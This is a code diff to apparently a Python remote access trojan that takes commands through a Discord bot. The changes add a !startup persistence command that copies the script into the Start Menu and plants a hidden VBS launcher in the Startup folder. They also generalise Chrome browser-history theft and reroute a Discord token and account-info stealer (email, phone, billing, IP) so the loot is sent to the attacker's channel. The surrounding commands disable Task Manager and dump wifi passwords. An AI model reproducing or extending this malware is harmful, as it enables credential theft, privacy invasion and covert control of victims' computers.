@@ -89,6 +89,7 @@ Availaible commands are :
 --> !distaskmgr = disable task manager(Admin rights are required)
 --> !enbtaskmgr = enable task manager(if disabled)(Admin rights are required)
 --> !getwifipass = get all the wifi passwords on the current device(Admin rights are required)
+--> !startup = add file to startup(when computer go on this file starts)(Admin rights are required)
 """
 
 async def activity(client):
@@ -386,8 +387,10 @@ async def on_message(message):
             import time
             import shutil
             temp = (os.getenv('TEMP'))
+            Username = (os.getenv('USERNAME'))
+            shutil.rmtree(temp + r"\history12", ignore_errors=True)
             os.mkdir(temp + r"\history12")
-            path_org = r""" "C:\Users\nanel\AppData\Local\Google\Chrome\User Data\Default\History" """
+            path_org = r""" "C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\History" """.format(Username)
             path_new = temp + r"\history12"
             copy_me_to_here = (("copy" + path_org + "\"{}\"" ).format(path_new))
             os.system(copy_me_to_here)
@@ -815,39 +818,21 @@ async def on_message(message):
                         phone = user_data.get("phone")
                         nitro = bool(user_data.get("premium_type"))
                         billing = bool(paymentMethods(token))
-                        embed = {
-                            "color": 0x7289da,
-                            "fields": [
-                                {
-                                    "name": "|Account Info|",
-                                    "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
-                                    "inline": True
-                                },
-                                {
-                                    "name": "|PC Info|",
-                                    "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
-                                    "inline": True
-                                },
-                                {
-                                    "name": "|Token|",
-                                    "value": token,
-                                    "inline": False
-                                }
-                            ],
-                            "author": {
-                                "name": f"{username} ({user_id})",
-                            }
-                        }
-                        temp = (os.getenv('TEMP'))
-                        f5 = open(temp + r"\infoo.txt", 'a')
-                        f5.write(str(embed))
-                        f5.close()
+                        embed = f"""
+Email: {email}
+Phone: {phone}
+Nitro: {nitro}
+Billing Info: {billing}
+value: IP: {ip}
+Username: {pc_username}
+PC Name: {pc_name}
+Token Location: {platform}                            
+username: {username} ({user_id})
+"""
+                        return str(embed)
             try:
-                    main()
-                    temp = (os.getenv('TEMP'))
-                    file = discord.File(temp + r"\infoo.txt", filename="infoo.txt")
-                    await message.channel.send("[*] Command successfuly executed", file=file)
-                    os.system(r"del %temp%\infoo.txt /f")
+                    embed = main()
+                    await message.channel.send("[*] Command successfuly executed\n"+str(embed))
             except Exception as e:
                     pass            
         if message.content == "!streamscreen" :
@@ -1381,11 +1366,10 @@ async def on_message(message):
                     reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                     import os
                     os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
-                    await message.channel.send("[*] Command successfuly executed")
                 else:
                     import os
                     os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
-                    await message.channel.send("[*] Command successfuly executed")
+                await message.channel.send("[*] Command successfuly executed")
             else:
                 await message.channel.send("[*] This command requires admin privileges")
         if message.content == "!enbtaskmgr":
@@ -1460,6 +1444,25 @@ async def on_message(message):
                         done.append(almoast)
                     await message.channel.send("[*] Command successfuly executed")  
                     await message.channel.send(done)
+            else:
+                await message.channel.send("[*] This command requires admin privileges")
+        if message.content == "!startup":
+            import ctypes
+            import os
+            import sys
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            if is_admin == True:  
+                path = sys.argv[0]
+                os.system(r'copy "{}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs" /Y'.format(path))
+                print(path)
+                e = r"""
+Set objShell = WScript.CreateObject("WScript.Shell")
+objShell.Run "cmd /c cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ && python {}", 0, True
+""".format(os.path.basename(sys.argv[0]))
+                with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
+                    f.write(e)
+                    f.close()
+                await message.channel.send("[*] Command successfuly executed")  
             else:
                 await message.channel.send("[*] This command requires admin privileges")
 client.run(token)
